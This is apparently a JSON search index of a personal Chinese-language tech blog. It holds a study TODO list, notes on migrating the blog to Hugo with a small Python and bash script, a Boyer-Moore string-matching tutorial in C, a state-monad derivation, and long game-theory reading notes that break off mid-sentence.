[{"content":"動機 TODO!!\nasync seastar framework IO ceph PG 搞懂定義 bio trace read/write path io_uring trace read/write path DB CMU 15-445/645 所有作業: 包含bTree, recovery, deadlock detection, deadlock prevention fall2018 fall2019 spring2023 tiKV? scallaDB trace read/write path etcd trace read/write path rocksdb trace read/write path Are You Sure You Want to Use MMAP in Your Database Management System? network CS144 所有作業 assigment dpdk trace read/write path xdp trace read/write path LC 解graph與seg tree 用C++ range解 distributed The part-time parliament \u0026amp; raft的關係 malloc golang mallocator Scylla Userspace I/O Scheduler Different I/O Access Methods for Linux, What We Chose for Scylla, and Why Qualifying Filesystems for Seastar and ScyllaDB Designing a Userspace Disk I/O Scheduler for Modern Datastores: the Scylla example part1 part2 The Scylla I/O Schedule Exploring How the Scylla Data Cache Works Scylla’s New IO Scheduler Deal with fsync() failure pgsql compiler p523 TLA+ write a spec somehow ","permalink":"https://littlebees.github.io/2024/02/todo-list/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003eTODO!!\u003c/p\u003e","title":"TODO List"},{"content":"動機 已經有一年沒有動過這邊了，想來翻新一下。 但是想到過去與nodejs和hexo對抗的經驗，另外build一個site真的很久(超過10秒)，所以決定換到hugo來\n同時把架構簡化一下，之前category太複雜了\n第一次嘗試: Stack 當下看theme覺得是最潮的，但是配置不好用(複雜)，雖然後面有找到template直接改，但還是不懂怎麼加新的頁面，同時build site還是要花到好幾秒，我就放棄了\nNow: PaperMod 配置簡單很多，但還是有一點坑\n用module吧 主要是不想上submodule XD\n加上\nmodule: imports: path: github.com/adityatelange/hugo-PaperMod 之後拉mod\narchive出現404 要自己生對應page的md\n--- title: \u0026#34;Archive\u0026#34; layout: \u0026#34;archives\u0026#34; url: \u0026#34;/archives/\u0026#34; summary: archives --- 自動把md改成page bundle 改成page bundle只要拿原本md的檔名改成folder name，之後mv md到folder/index.md就好\n之前寫的leetcode要換category 之前寫的header大概長這樣\ntitle: leetcode-61 - Rotate List tags: - Two Pointers - Linked List categories: - [Algorithm, Leetcode, seanprashad] date: 2021-08-05 22:58:21 categories太複雜了，想把它放到tags去，變成\ntitle: leetcode-61 - Rotate List tags: - Two Pointers - Linked List - seanprashad categories: - Leetcode date: 2021-08-05 22:58:21 找了一輪沒有方便的md parser幫我做事，只好自己寫了 line by line處理的話就是就可以當成finite state machine來處理了\nimport re, sys def trans(f,header, seenTop, cate): s = f.readline().strip() if s == \u0026#39;---\u0026#39;: if seenTop: return else: trans(f,header, True, None) elif not s: trans(f,header, seenTop, cate) elif s[-1] == \u0026#39;:\u0026#39;: # tags: , categories: header[s[:-1]] = [] trans(f,header, seenTop, s[:-1]) elif s[0] == \u0026#39; \u0026#39; or s[0] == \u0026#39;-\u0026#39;: if \u0026#39;, Leetcode,\u0026#39; in s: pattern = r\u0026#39;\\[.*,\\s*([^]]*)\\]\u0026#39; else: pattern = r\u0026#39;-\\s*(.*)\u0026#39; header[cate].append(re.search(pattern, s).group(1)) trans(f,header, seenTop, cate) else: ss = s.split(\u0026#34;: \u0026#34;) header[ss[0]] = ss[1] trans(f,header, seenTop, None) def mkHeader(h): title = f\u0026#39;title: {h[\u0026#34;title\u0026#34;]}\u0026#39; date = f\u0026#39;date: {h[\u0026#34;date\u0026#34;]}\u0026#39; tags = \u0026#39;\\n\u0026#39;.join([\u0026#34;tags:\u0026#34;] + list(map(lambda x: \u0026#34; - \u0026#34;+x, h[\u0026#34;tags\u0026#34;]+h[\u0026#34;categories\u0026#34;]))) cate = f\u0026#39;categories:\\n - Leetcode\u0026#39; return f\u0026#39;---\\n{title}\\n{date}\\n{cate}\\n{tags}\\n---\u0026#39; with open(sys.argv[1]) as f: h={} trans(f, h, False, None) print(mkHeader(h)) 之後就可以把新生出來的header用bash接到原本的檔案去了~~\n等等，為什麼不在python直接append就好? 因為不知道為什麼python吐出來的東西會動到text encoding，會出現類似U+00a0之類的東西 所以只能用bash自己append\nfor p in $(ls *.md); do name=$(echo $p | cut -d\u0026#39;.\u0026#39; -f1) mkdir $name if [[ $name == leetcode* ]]; then python3 hi.py $p \u0026gt;\u0026gt; $p.tmp cat $p | awk \u0026#39;/^---$/ {if (!p) p=1; else p=0; next} !p\u0026#39; \u0026gt;\u0026gt; $p.tmp rm $p mv $p.tmp $p fi mv $p $name/index.md done ","permalink":"https://littlebees.github.io/2024/02/move-to-hugo/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e已經有一年沒有動過這邊了，想來翻新一下。\n但是想到過去與nodejs和hexo對抗的經驗，另外build一個site真的很久(超過10秒)，所以決定換到hugo來\u003c/p\u003e\n\u003cp\u003e同時把架構簡化一下，之前category太複雜了\u003c/p\u003e","title":"Move to Hugo"},{"content":"動機 現在重看一遍還是很複雜\nBoyerMoore 從後面開始比\n不符合的字元: 壞字元 已經比過的後綴: 好後綴 mismatch時就是看 壞字元 或是 好後綴 誰跳得比較多，就選哪一個\n下面\nbad是下一個壞字元出現的位置，所以要看與最後一個的距離決定跳多遠 good就直接是要跳多遠 int BoyerMoore(char p[], char s[]) { int ALPHABET_SIZE = 256, len = strlen(p); int bad[ALPHABET_SIZE+5], good[len+5]; getBadChar(bad, ALPHABET_SIZE, p); getGoodSuffix(good, p); int j = 0, i; while(j \u0026lt;= strlen(s) - len) { for(i = len - 1; i \u0026gt;= 0 \u0026amp;\u0026amp; p[i] == s[i+j]; --i) { ; } if(i \u0026lt; 0) { return j; } else { j += max(bad[s[i+j]]-(len-1-i), good[i]); } } return -1; } 壞字元 遇到mismatch就往後跳到下一個有一樣字的\ninline void getBadChar(int bad[], int ALPHABET_SIZE, char pattern[]) { int len = strlen(pattern); for(int i = 0; i \u0026lt; ALPHABET_SIZE; ++i) { bad[i] = len; } for(int i = 0; i \u0026lt; len; ++i) { bad[pattern[i]] = len - 1 - i; } } 好後綴 如果前面有完全一樣的後綴，直接跳過去 如果從部分後綴與從開頭開始的一樣，直接跳過去 都沒有，就整個跳掉 這裡的跳掉就是從當前的點向後移動，所以下面good最後的內容都是len - 1 - i 也就是當前與最後的距離\ninline void getGoodSuffix(int good[], char pattern[]) { int len = strlen(pattern); int suffix[len]; // 這是 以 i 為終點往前看有多長是與從最後往前看一樣的長度 // a b c d f b c d // 0 0 0 3 0 0 0 8 getSuffix(suffix, pattern); // case 3 // 假設都沒有好後綴，就把整條跳過去 for(int i = 0; i \u0026lt; len; ++i) { good[i] = len; } // case 2 // 有 0 ~ j的後綴 與 當前的部分後綴 相同 for(int i = len-1, j = 0; i \u0026gt;= 0; --i) { if(suffix[i] == i + 1) { for(; j \u0026lt; len - 1 - i; ++j) { if(good[j] == len) { good[j] = len - 1 - i; // 把後面都吃掉 } } } } // case 1 // 有一樣的後綴，整個跳過去 for(int i = 0; i \u0026lt;= len-2; ++i) { good[len-1-suffix[i]] = len - 1 - i; } } suffix 最簡單的就是每一次都從後面開始比\ninline void getSuffix(int suffix[], char pattern[]) { int len = strlen(pattern); suffix[len-1] = len; for(int i = len - 2; i \u0026gt;= 0; --i) { int j = i; while(j \u0026gt; 0 \u0026amp;\u0026amp; pattern[j] == pattern[len-1-(i-j)]) { --j; } suffix[i] = i - j; } } 但其實可以利用已經比好的suffix，只要suffix包含在其中，就可以利用對稱直接算 inline void getSuffix(int suffix[], char pattern[]) { int len = strlen(pattern); int g = len-1, f; suffix[len-1] = len; for(int i = len - 2; i \u0026gt;= 0; --i) { if(i \u0026gt; g \u0026amp;\u0026amp; suffix[(len-1)-(f-i)] \u0026lt; i - g) { suffix[i] = suffix[(len-1)-(f-i)]; } else { if(i \u0026lt; g) { g = i; } f = i; while(g \u0026gt;= 0 \u0026amp;\u0026amp; pattern[g] == pattern[(len-1)-(f-g)]) { --g; } suffix[i] = f - g; } } } Ref Boyer-Moore 算法 Boyer-Moore algorithm grep之字符串搜索算法Boyer-Moore由浅入深（比KMP快3-5倍）（转） Boyer-Moore-algorithms-good-suffix-shift-examples-15_fig1 Boyer Moore Algorithm | Good Suffix heuristic Boyer-Moore good-suffix heuristics\n","permalink":"https://littlebees.github.io/2022/07/booer-moore%E5%AD%97%E4%B8%B2%E6%AF%94%E5%B0%8D/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e現在重看一遍還是很複雜\u003c/p\u003e","title":"booer moore字串比對"},{"content":"動機 state monad是left 2 right，對應到iteration (左遞迴) reverse state monad是right 2 left，對應到recursion (右遞迴)\nderive state monad 轉成iteration def s(l): if not l: return 0 else: return l[0] + s(l[1:]) def s2(l, acc=0): if not l: return acc else: return s2(l[1:], l[0] + acc) 把acc往下推 def s3(l): if not l: return lambda acc: acc else: return lambda acc: s3(l[1:])(l[0] + acc) 用成類似monad的樣子 def ret(acc): return acc def bind(mx, f): return lambda acc: mx(f(acc)) def s4(l): if not l: #return ret(0) return ret else: return bind(s4(l[1:]), lambda acc: l[0] + acc) def s2(l, acc=0): if not l: return acc else: return s2(l[1:], l[0] + acc) 到s4其實就推的差不多了，但是ret其實不符合monad的return定義 所以我們改一下\nreal state monad def ret2(acc): return lambda ignored_acc: acc def bind2(mx, f): return lambda acc: f(mx(acc)) def s5(l): if not l: return ret2(0) else: return bind2(s5(l[1:]), lambda acc: l[0] + acc) def s(l): if not l: return 0 else: return l[0] + s(l[1:]) 如果去走一下整個過程會發現他與遞迴版的很像，因為0是從底部給，不像之前是依靠外面給\nstate monad state monad其實就是會留一層acc在外層等人給 剩下就是找順序來，所以是left 2 right\nnewtype State s a = State { runState :: s -\u0026gt; (a,s) } instance Functor (State s) where (\u0026lt;$\u0026gt;) :: (a -\u0026gt; b) -\u0026gt; State s a -\u0026gt; State s b (\u0026lt;$\u0026gt;) fn (State sa) = State (\\s0 -\u0026gt; let (a, s1) = sa s0 in (fn a, s1)) instance Applicative (State s) where pure :: a -\u0026gt; State s a pure a = State (\\s -\u0026gt; (a,s)) (\u0026lt;*\u0026gt;) :: State s (a -\u0026gt; b) -\u0026gt; State s a -\u0026gt; State s b (\u0026lt;*\u0026gt;) (State sa) (State sb) = State (\\s0 -\u0026gt; let (fn, s1) = sa s0 (a, s2) = sb s1 in (fn a, s2)) instance Monad (State s) where (\u0026gt;\u0026gt;=) :: State s a -\u0026gt; (a -\u0026gt; State s b) -\u0026gt; State s b (\u0026gt;\u0026gt;=) (State sa) fn = State (\\s0 -\u0026gt; let (a, s1) = sa s0 -- 先往下遞迴 State sb = fn a -- 拿到的往f灌 in sb s1) -- 接回去 reverse state monad reverse的話就是先往右手邊遞迴，做出right 2 left的效果\ninstance Applicative (ReverseState s) where pure x = ReverseState $ (,) x mf \u0026lt;*\u0026gt; mx = ReverseState $ \\s -\u0026gt; let (x, future) = runReverseState mx s -- 先往右遞迴 (f, now) = runReverseState mf future -- 終於回來了，用前面的值灌回來 in (f x, now) 如果用與前面一樣的想法(先做右邊)，去設計monad 會遇到一個問題\n我們只有f要怎麼右遞迴\ninstance Monad (ReverseState s) where mx \u0026gt;\u0026gt;= f = ReverseState $ \\s -\u0026gt; let (b, future) = runReverseState ?? s (a, now) = runReverseState mx future in (b, now) 我們目前的值，其實是在mx之中，所以要想方法拿到mx裡面的值 要拿mx的值要透過runReverseState 不是已經call過了嗎 (a, now) = runReverseState mx future 所以把這個值餵回去f就好了\ninstance Monad (ReverseState s) where mx \u0026gt;\u0026gt;= f = ReverseState $ \\s -\u0026gt; let (b, future) = runReverseState (f a) s (a, now) = runReverseState mx future in (b, now) Q: 怎麼可能有futrue又有a，這樣不是互相依賴嗎? A: haskell是lazy的\nRef The Curious Time-Traveling Reverse State Monad You Could Have Invented The State Monad\n","permalink":"https://littlebees.github.io/2022/07/state-monad-reverse-state-monad/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003estate monad是left 2 right，對應到iteration (左遞迴)\nreverse state monad是right 2 left，對應到recursion (右遞迴)\u003c/p\u003e","title":"state monad \u0026 reverse state monad"},{"content":"動機 好看!! 讓我之後想去看Algorithmic Game Theory\nch1: 各種小故事 猜數字: 考慮到其他參賽者的策略與目標，與他們的策略如何影響你的策略 給5次機會猜，每猜錯一次就扣獎金\n一般猜數字就是用binary search，但是對手一定想的到 所以會想要用一個可以誤導binary search的數字\n49? 但對手想到你會想到你會反制binary search，所以又再往前一步 48?\n想到你的想到 回去選49?或47?\n以退為進: 預測所有對手的行動 一個耐力比賽，三個人撐到最後的贏，由最贏的選一個被淘汰的\n最弱的人知道其他兩人一定會選自己到下一場比賽，所以最弱的就自己輸，下去休息\n妙手: 個人利益換群體利益 與 混合策略 如果對方認定真的有妙手存在，對方勢必要多派人防守，進而使其他人的得分上升\n如果左手是妙手，反而要使用右手進攻，後面會提到混合策略讓總得分上升\n但混合策略需要真的混合，也就是不可預測，讓對手不知道怎麼應對 不會說每次都勝利，但只要是反覆進行賽局下，這樣可以讓總收益上升\n要不要做老二: 為了保持領先而模仿 模仿分兩種\n不論對方策略好不好都模仿 等一段時間，確認成功與否才模仿 一般商業都是等一段時間再模仿，因為商場很少贏家通吃的事發生，所以等越久越有利\n永不妥協: 讓承諾看起來像真的 永不妥協不好實行\n會連累到其他談判 (影響他人) 自己要有辦法演到像真的 (自己會不會動搖) 減肥: 與未來的自己的賽局 現在想做不代表未來也會繼續或是想做\n所以要提供激勵改變未來的選擇，或是說項未來的自己能做的是變少\n只有個人捐款的法案: 囚徒困境 現在有個法案是只容許個人捐錢給政黨(上限5000美)，其他方式都禁止\n這時只要說，如果法案沒過，就給投最多同意票的黨10億美 這樣法雸會過，同時也不用付錢(法案過了)\n想要贏大的: 虛張聲勢 如果只在牌好時加碼，這樣其他人就不會跟 所以需要其他人認為自己在虛張聲勢，引導其他人加碼\n但有時虛張聲勢可以騙其他人放棄，使爛牌有的贏\n人的心理與情緒: 理論對於有經驗的比較準 賽局理論對於會玩得很準，但是如果對方亂玩，就會有非預期的結果 所以要把心理與非理性納入考量\n參於賽局時需要理解對方的想法、他們知道什麼；是什麼驅動他們、他們怎麼看你 己所欲、亦勿施於人\n一場賽局都是更大賽局的一部份\nch2: 循序賽局，逆推求解 賽局根據，出招的時間序分成下面3種\n循序賽局: 一次一個人出招 拔旗子遊戲 同步賽局: 同時出招 囚徒困境 循序 \u0026amp; 同步 足球比賽 向前預測，向後推理: 樹的每一層都是自己與對手的回合，從中有許多動作，之後到leaf會有自己與對手的收益\n如果說每個leaf的雙方收益總和都一樣，就是零和賽局 可以調整tree上的東西讓能到的leaf不同 branch 讓對方不做某種動作 自己不做某種動作 leaf 讓收益的計算方式改變 像下面這棵樹是說服charlie投資與fredo會不會捲款的tree\n如果fredo像讓charlie投資，要承諾charlie他不會捲款\n下面是總統與國會各自偏好的法案，所產生的利益\n國會送法案到總統那邊簽，之後有以下賽局樹 如果總統有否決權(veto) 剛剛總統與國會的例子，讓我們看到\n單人決策中，有更多選項不是壞事 在賽局中有更多選項，反而傷害了兩者的利益!! 下面是一個搶旗遊戲，雙方輪流拿1,2,3個旗子，直到某一隊拿完全的旗子就獲勝 書上沒有論證的過程所以這邊給一個\n我們想要到我們這邊時就是小於等於3個旗子，所以思考 有什麼情況是一定會讓對手不管怎麼選都是只剩小於等於3個旗子?\n答案就是4個旗子\n但不能在這邊停下來，再往下想如何留給對手4個旗子? 要留給對手多少旗子才能保證我們可以留給對手4個旗子?\n其實就是8個\n所以就是控制留給對手4的倍數的旗子\n為何搶旗遊戲逆推可解? 因為搶旗遊戲的所有東西都是可確定的，也就是\n雙方目標、目的 雙方手段、行動 都是確定的 (沒有心理或是利他因素的參與)\n人不是總是逆推求解 最終通牒賽局: A提議分$，B選要不要接受，如果B不同意就兩人都沒$ 一般來說不論分多少，只要有B都應該接受，但實際情況是A分的比例通常不會低於10%\n可能有3個原因\nA不懂逆推求解 A的其他考量 (利他心理) B不同意提案 書上是說第一個不太可能成立，因為這很好想，所以問題一定是2或3其中一個理由或是兩個都有\n所以有了獨裁者賽局: 直接分不管對方同意於否 這時應該是獨裁者全拿吧? 但實驗結果還是雙方都有$，但比起最終通牒賽局的$還要少10%\n對此有人猜是利他、公平、羞恥。 其中比較有趣的是羞恥，有個版本的賽局是可以給1塊$讓對方不知道獨裁者獨吞了所有$ 而大多數獨裁者都同意這個提案\n文化也會影響，在鼓勵分享的文化中，分$的額度會超過50%\n超級複雜的tree 像棋局，想用tree去求解十分難，所以\n需要設計好評斷當前局面的方式 (計算價值) 預測一部份，不用一次預測到底 (在棋子不多時專業選手就能預測這局的勝負) 你應該在最大推理範圍中，把向前預測、像後推理的規則與引導你判斷中盤局面價值的經驗結合起來\n成功逆推的關鍵 預測對方會做什麼行動，而非你站在他們立場會採取什麼行動 當你嘗試站在對方角度看問題，你必須知道他們知道的，不知道他們不知道的訊息\n如果雙方都分析出所有雙方的行動與反行動，這樣雙方對賽局將會如何會有一致的看法(均衡)\n越早冒險越好 如果是第一次冒險失敗還有機會思考其他策略，這個越早冒險越好的策略也適用於其他生活方面\nch3: 囚犯困境 \u0026amp; 合作 現在是同步賽局，可以把行動組合成一張表 右上是上面的收益，左下是右邊的收益\n從RE的角度去看\n80的話 第一格是平手 第二格是輸 70的話 第一格是贏 第二格是平手 所以如果是RE，不論對手怎麼做，RE都應該設定成70 這就是RE的優勢策略(有優勢策略選他就對了)\n但這裡帶出一個特別的賽局，囚徒困境 雙方都選優勢策略(個人利益最大化)，但最後的總收益反而變少 這打臉傳統經濟學的追逐個人利益可以帶來集體的最佳結果\n對此需要一個方式讓大家做某個行為\n獎勵 增加效益 獎勵的形式 實質利益 承諾 有對方食言的風險 獎勵的來源 內部: 提供對手一定的好處 外部: 由受益的人給雙方獎勵 不能在完成動作之前就給獎勵!! 懲罰 可能立刻見效 增加代價 選擇欺騙可能拿到短期好處 但產生長期的代價 以牙還牙: 一開始合作，之後看對手怎麼做，之後就怎麼做\n具有 清晰 對手不用特別思考你行動的目的 善意 不會主動引發欺騙 寬容 不會一直懷恨在心，願意回復合作 報復 永遠不會讓騙子逍遙法外 在賽局中有相對出色的成績，但不能正面擊敗對手 優點 總是讓比賽結果相近 (鼓勵合作) 缺點 不能被誤解或是出錯，讓對手錯認我們的行動 不小心選錯就被當成背叛 少一個宣布【到此為止】的方法 容易被激發，但不容易被原諒 (雙方都用以牙還牙) 所以怎麼達成合作 成功的懲罰\n覺察欺騙 才能快速啟動懲罰行動 提高欺騙成本 減少欺騙好處 如果賽局不只一人同時行動 要確認是否存在欺騙 找出欺騙者是誰 不然，會變成無盡的割喉戰 清晰性 可接受行為的界線 欺騙的後果 如果上面兩個定義不清 容易失誤、被誤會成欺騙 無法清楚的權衡 懲罰的類型 只有一次的賽局 導致其他方面的損失 () 重複賽局 導致後面賽局的損失 能否阻止欺騙者取決於 欺騙的收益 未來對於現在的重要性 確定性 所有人都要相信 背叛會懲罰 合作會獎賞 明確告知規則 (不一定是書面，可以是不成文規定) 規模 如果懲罰的規模夠大 (像核彈) 不用執行就有嚇阻效果 如何處理失誤 需要某種程度的放寬 規模要大到可以嚇阻大部分的欺騙，但某種程度的放寬 重複性 未來的價值 (像利率) 彼此關係延續的可能性 如果是one-shot的商品，就很有可能選擇削價競爭 會不會在其他方面受到背叛 經濟規模隨時間的預期變化 預期變好 或 市場平穩 就不會選現在背叛 預期變壞 或 波動期時 就會選現在背叛 變化的種類 穩定的增加、衰退 波動 賽局成員的結構 結構穩定 與 預期會保持 就不會選現在背叛 有無關或新的人 就會選現在背叛 accessibility 當規則確定後 所有都可以輕鬆地知道或是get需要的訊息 雖然說每個人都有欺騙的動機 只要讓每個人認為設計好的規則共同的優先利益 如此每個人 利用自己的知識找出規則漏洞 增加集體採用聯合制裁的可信度 康德的定然律令\n只做那些會成為普遍法則的事 有人認為自己做的決定的思考與對方一樣 所以選合作，認為對方也會選合作 實際上，如果對方不知道對手選合作，人們選合作的比率比較高 知道對方選合作，另一方選合作的比率反而比較低 企業聯盟\n合謀 定期聚會 協商界線 及時懲罰與辨認失誤 溝通 需要一種不能被發現的協議 如果想要這地區的競標，就出該地區電話號碼末3碼的數字 依據地域劃分市場 尋找背叛 決一死戰條款 保證最低價、買貴退差價 顧客對低價敏感，作為背叛偵察機 一旦有人背叛，自動降價 使對方沒有因為降價而產生的好處 最惠顧客條款 對所有顧客提供特定客戶的最惠價格 這意味廠商不能公然競爭，不能提供其他價格給對手的顧客 保證合作 一擊必殺條款 決一死戰條款的延伸 利用納許均衡求平衡點，之後只要發現背叛就直接降到這個點 ch4: 納許均衡 如果要打大獵物需要兩個人一起，但有兩種獵物，同時分別在不同方位 再來，兩人的家也在不同方位，如果沒有想獵大獵物可以獵兔子\n這裡沒有最佳策略，因為打大獵物的總收益居然一樣!!\n回憶之前的囚徒困境，我們是有最佳策略的\n所以要知道對方想什麼才能得出最佳策略，但對方也是這麼想 所以就陷入【我認為\u0026hellip;他認為\u0026hellip;】的循環\n納許均衡 先看對於每個RE的策略，RR應該怎麼回應 選所有收益中最大的\n下面用粗體標出最佳收益\n注意到40000是兩個的最佳收益，所以可以預期在沒有其他介入的情況下，兩者應該都會選40000\n這就是納許均衡，每個人都相信對方會以我們認為的最佳行動做事，而他們也這麼認為我們也會依據他們認為的最佳行動做事 (也就是同一個格子中都是雙方的最佳回應)\n納許均衡只會有一種嗎? 不會，像第一個就有三個納許均衡\n納許均衡是最好的解嗎? 不一定，看看囚徒困境\n納許均衡一定存在嗎? 如果容許混和策略，納許均衡一定存在\n求解納許均衡 先踢掉對方絕對不會選的選項 (BB絕對不會選42或38) 對BB而言，42的所有收益都比41爛，所以絕對不會選42 all(a \u0026gt; b) 對BB而言，42中沒有任何優勢選項，所以絕對不會選42 not any(exist(best)) 任何一個劣勢策略或絕非最佳回應策略，絕對不會成為最佳回應，所以可以踢掉\n清完表格後，找同一格中互為最佳回應的格子，那就是納許均衡\n焦點 所以還有辦法處理第一個賽局嗎? 我們需要一個我們與對方覺得很清楚的想法或是概念，讓選擇更集中形成焦點\n像是書上提到要兩組在不知道對方長什麼樣子，也沒有特別識別的手段下與另一組相會 所以雙方都要考慮到什麼對對方都是明顯的地點(帝國大廈、中午、手勢)\n所以焦點出自很多地方，歷史、文化、地理\u0026hellip; 焦點可能是一時興起的事物!! 所以可能有爆紅之類的現象，或是選美小姐第一的人不一定臉蛋是最好的\n換言之，焦點就是共識 談判就是在尋找雙方不會退讓的焦點\n性別戰與膽小鬼遊戲 剛剛的所有賽局都是所有人對任何一個納許均衡解都沒差，因為收益都一樣 但如果現在不一樣且還有利益衝突?\n像下面的賽局是有各自的偏好，所以有兩個納許均衡 所以雙方需要溝通，但\n要怎麼讓對方知道，對方也確定知道，同時正確的理解 要怎麼讓自己的堅持可信 對於膽小鬼遊戲與性別戰的雙方來說，大家都想要納許均衡解 但膽小鬼遊戲不同於性別戰在於兩個人要做出相對的選擇才會有納許均衡解 下面是把獵場分成南北，北邊小但獵物多，但如果兩人都去北邊就會打架，最後什麼都沒有 這種問題的解法與性別戰一樣需要溝通\n前往連續 之前只有兩個行動，到剛剛行動多一點(38~42)，但如果是連續的整數呢?\n找交點 理論的極限 當交易人數不多，且都無法得知其他交易者的成本或價值時，就會很快達到納許均衡\n賽局中的參與者有不同的偏好或評價，其不同於經濟學所假設的純粹自利行為\n但，一旦把現實中的【社會的】或【利他的】傾向考慮進去，均衡的概念，在逐步行動賽局中是向後推理，在同步行動賽局中是納許均衡，就能充份解釋觀察的結果\n當賽局不只一種納許均衡，所有人就會遇到額外的問題，需要找出一個焦點 能否成功取決於，背景、環境因素；如果有共識就會有好選擇，沒有，不均衡就會持續下去\n新手行為通常與納許均衡不一致，但經驗累積後，行為通常就能收斂在均衡點 有處理這種不確定性，並讓參加者對其回應的均衡，quantal response equilibrium\nch5: 混和策略 從足球罰球開始，這沒有納許均衡 (如果對手知道要踢右，就會往右跳，知道對手要守左，就會踢右)\n這裡於之前看到的【我認為\u0026hellip;他認為\u0026hellip;】的循環一樣，但是在此\n如果我們的推論是依據任何模式或是規律，就會被對手利用變成他自己的有利條件 記住，時時刻刻都要思考【他們知道什麼我不知道的事嗎】\n在此單靠唯一一種策略(單純策略)，是不行的，最好的就是踢右邊 (70%) 所以為了達成納許均衡，我們需要加入隨機性，也就是混和策略\n像是50對50去分左右腳，所以\n守右邊: 0.5*95+0.5*70 = 82.5% 守左邊: 0.5*58+0.5*93 = 75.5% 這兩種都比只踢右邊高，而對手一定選最小的，所以會去守左邊 但又不能只守左邊，所以對手也必須用混和策略!! (達成納許均衡)\n你應該選擇自己的最佳混和策略的理由是，逼迫對手也使用他的最佳混和策略\n之後呢，雙方會找到均衡點，此時最大報酬的最小值會等於最小報酬的最大值 (minimax定理) 也就是一個人的得等於另一個人的失，所以只要求一邊就好\n那什麼時候該使用混和策略? 如果對手在行動前知道我們怎麼做回應會對我們有害的話\n那最佳混和策略在哪? 用40對60去分左右腳，所以\n守右邊: 0.4*95+0.6*70 = 79% 守左邊: 0.4*58+0.6*93 = 80% 等等，守左右邊的數字好像靠近了!! 這就是最佳混和策略的目的，只要找到一組比例，讓所有對手策略的收益都一樣，就是最佳混和策略\n守右邊: 0.383*95+0.673*70 = 79.6% 守左邊: 0.383*58+0.673*93 = 79.6% 在完全衝突(零和賽局)下，如果讓你的對手事先知道你的真實選擇對你不利，那妳可以利用隨機選擇自己的單純策略而獲利 你的混和策略比例應該是: 不管對手採取任何單純策略，你拿到的平均報酬都相同\n怎麼真的隨機? 人會陷入多次反推的陷阱(出這麼多次正面，下次總該是反面了吧) 所以需要一個客觀、獨立、祕密的機制，像是當下手表的秒針在哪\n混和動機賽局的混和策略\n如果我們把混和策略用在之前有多個納許均衡的賽局會發生什麼事 下面是之前狩獵的賽局\n找慣例先從左邊開始看 設我們認為對手選stag的機率是x，之後我們讓兩個行動的收益一樣 4x+0(1-x) = 3(1-x)+0x\n所以對手選stag的機率是x是3/7 這時\n不論我們的策略怎麼混和，最後的報酬都一樣 前提是對手選stag的機率是x是3/7 因為這個賽局是對稱的，所以對手會算出我們選stag的機率是x是4/7 最後的效果反而不好 我們選stag但對手選bison: 3/7 * 3/7； 我們選bison但對手選stag: 4/7 * 4/7 總和是(9+16)/49，超過一半是雙方都沒有報酬!! 平均報酬是4*(3/7) = 1.71，比原本的納許均衡爛!! 同時這種混和策略不穩定，只要差一點就會變成偏向其中一方，這樣混和策略就瓦解了 對此只能讓雙方協調出其他混和策略，像各一半(假設一天下雨機率是50%，就看有沒有下雨) 這樣，0.5*3+0.5*4 = 3.5\n我們認為的機率 因為這些算的是我們認為的機率，所以只要我們的報酬有變，就會影響到對方選擇的機率 像報酬從3,4變成6,7 這樣x就變成7/13\n實際賽場中的混和策略 混和策略會讓我們有機率用到冒險的策略，但重點不是冒險的策略會不會成功，重點是讓對手看不透我們的策略\n基於這種看不透可以，用低管理成本完成管理\n把懲罰調很重，之後就可以減少用於檢查的資源 在被檢查人眼中，因為被查到成本太高，所以不會傾向於做犯法的事 而要做反制，也是用混和策略 (飛彈中藏一些假飛彈) 但我們知道有的時候還是會出現不好的狀況，所以如果可以協調就能拿到更好的收益 像從商家隨機發折價卷(可能兩家同時發)，變成輪流發\n用代數解均衡點 下面兩張圖剛好講到minimax 接著看一個有趣的case 如果守門員防右邊的效率上升，導致射門員右邊成功率下降成60% 這樣，守門員使用左邊的比率會上升，變成50%!!\nwhy? 因為射門員觀察到右邊成功率下降，所以減少射到右邊，導致守門員使用左邊的比率會上升 換言之，進步反而暴露你的弱點!! 從這個角度看，改善弱點的方法反而是不要一直用這個弱點技能\nch6: 策略行動，改造賽局樹 策略行動定義為 能夠改變賽局，以確保參與者採去行動後能的到更好的結果\n像是在膽小鬼賽局中，先對手把方向盤拆掉 我們的選擇變少(少一個row)，但對手的最佳選擇只剩下認輸 對手有更多自由，但是是失敗、成為懦夫的自由\n承諾: unconditional的策略行動 我就是做，不管你之後做什麼；但多了這一個動作，能改變原本的結果\n像是賴床 多了設定鬧鐘後 如果把上面的tree畫成table 會發現設鬧鐘其實是劣勢策略(收穫都比不設低)\n這是循序賽局，不是同步不用應對對手的所有策略 這是策略行動，重點是對手要做我們希望的動作 威脅與約定: conditional的策略行動 如果對手做了(或沒做)我們希望(或不希望)的動作，我們就會做某件事(回應規則)，而這件事可能傷害到我們\n約定特別一點，因為只要對方做了之後，對方就沒有利用價值了，所以約定傾向於食言\n記得，回應規則是事先設定\n所以這需要\n搶先說 可信: 真的發生了一定要做 例子就是前面提到的競爭對抗條款(對方低價，我們就跟進)\n嚇阻與強迫: 威脅與約定的再細分 嚇阻: 阻止他人想做的事 強迫: 讓他人做不想做的事\n警告與保證: 威脅與約定的no-op版 如果威脅與約定的回應規則，就是我們的最佳行動(或是說對我們有利的行動)，這種特例叫警告與保證 具有公告的作用\n像是只要對手不降價，我們就不降價\n讓出先行權? 可以等其他對手把他們的行動或是策略行動做完再動作 像是第一章的大公司會跟隨小公司的策略一樣，以維持均衡\n威脅與約定的差異 威脅是要對方不要做 約定是我們會做\n代價 威脅比較低，因為只要對方不做就不會讓我們做出需要代價的事 公司威脅員工不努力就不會有分紅 約定就要做了(除了食言) 設定期限 (嚇阻與強迫) 嚇阻不用設定期限 【什麼時候能吃?】【永遠都不能吃，不然會有很慘的事發生在你身上】 強迫就要定期限(要看到對方完成) 對此產生【臘腸戰術】 如果對方不太想實踐這個威脅，就可以一點一點地打破 【下午一點打掃】【要讀書，明天再掃】(之後一直上演) 所以通常強迫用獎勵會比較好 做完就有點心吃 讓懲罰隨時間增加，獎勵隨時間減少 威脅與約定要有清晰性與確定性才有可信度 規定要清楚，不一定是有或沒有(一個門檻)可以像是隨績效變好獎金自然變多\n巨大的威脅 